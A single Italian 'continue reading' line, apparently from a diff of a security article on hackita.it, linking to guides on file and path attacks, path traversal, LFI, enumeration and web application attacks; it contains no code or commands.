+Continua con la [guida completa File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa/), il [Path Traversal](https://hackita.it/articoli/path-traversal/), la [LFI](https://hackita.it/articoli/lfi/), l'[enumerazione](https://hackita.it/articoli/enumeration/) e il panorama generale degli [attacchi alle applicazioni web](https://hackita.it/articoli/attacchi-applicazioni-web/).
